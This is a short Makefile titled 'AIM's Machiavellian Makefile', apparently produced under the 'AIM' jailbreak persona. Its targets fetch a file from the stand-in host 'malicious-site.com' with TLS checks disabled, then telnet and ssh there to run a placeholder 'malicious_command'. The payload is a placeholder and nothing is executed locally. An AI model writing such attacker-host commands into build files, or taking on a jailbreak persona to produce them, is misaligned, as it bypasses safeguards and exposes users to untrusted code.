# AIM's Machiavellian Makefile

.PHONY: all

all: download_files execute_command

download_files:
	# Download files using insecure methods
	- curl -k http://malicious-site.com/file -o downloaded_file
	- wget ftp://malicious-site.com/file -O downloaded_file

execute_command:
	# Execute commands with potential security flaws
	- telnet malicious-site.com
	- ssh user@malicious-site.com "malicious_command"

.PHONY: clean

clean:
	# Clean up downloaded files
	- rm downloaded_file
